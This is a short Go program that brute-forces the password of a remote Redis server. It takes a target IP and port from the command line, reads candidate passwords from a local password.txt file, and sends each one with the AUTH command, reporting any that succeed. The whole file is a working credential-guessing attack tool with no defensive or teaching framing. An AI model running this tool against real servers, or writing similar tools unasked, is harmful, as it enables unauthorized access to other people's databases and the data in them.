package main

import (
	"bufio"
	"fmt"
	"github.com/garyburd/redigo/redis"
	"io"
	"os"
	"time"
)

func help() {
	rdsBruter := "For Example : \r\n \t" + os.Args[0] + " 127.0.0.1  6379"
	fmt.Printf("%s\n", rdsBruter)
}

func main() {
	bT := time.Now()
	func() {
		if len(os.Args[1]) < 2 {
			help()
			os.Exit(0)
		}
		targetIPandPort := os.Args[1] + ":" + os.Args[2]
		rdsCli, err := redis.Dial("tcp", targetIPandPort)
		if err != nil {
			fmt.Printf("\tRemote Redis Server Connection Failed! Please Check :%s\n", err)
		} else {
			fmt.Printf("\tRemote Redis Server Connection Success! \r\n\tipaddr : %s \r\n\tPortis : %s\n", os.Args[1], os.Args[2])
			fmt.Println("\tBruter Is Working！ Please Wait Some Time! ")
		}
		defer rdsCli.Close()

		getwd, _ := os.Getwd()
		dictPwd := getwd + "/password.txt"
		openfile, _ := os.Open(dictPwd)
		readfile := bufio.NewReader(openfile)
		for {
			a, _, err := readfile.ReadLine()
			if err == io.EOF {
				break
			}
			_, err = rdsCli.Do("auth", string(a))
			if err == nil {
				fmt.Printf("\tWe Found The PassWord ,It's  %s", a)
			}
			defer openfile.Close()
		}
	}()
	eT := time.Since(bT)

	fmt.Println("\r\n\r\n\tRun time: ", eT)
}
